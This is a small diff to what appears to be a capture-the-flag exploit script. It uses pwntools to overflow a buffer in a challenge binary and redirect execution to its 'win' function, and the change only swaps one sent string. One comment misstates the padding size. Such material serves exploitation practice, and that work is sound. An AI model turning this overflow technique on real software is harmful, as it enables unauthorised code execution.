@@ -13,7 +13,7 @@ payload = b''
 payload+= (0x40 + 0x8 - 0x10) * b'A' #we use 0x60 because this is the argument that's passed into RDI [calling convention]
 elf = ELF("./chall_04") #used to call the methods in system
 payload += p64(elf.sym.win)
-p.sendline("andyrulz")
+p.sendline("junk")
 p.sendline(payload)
 p.interactive()
 ls
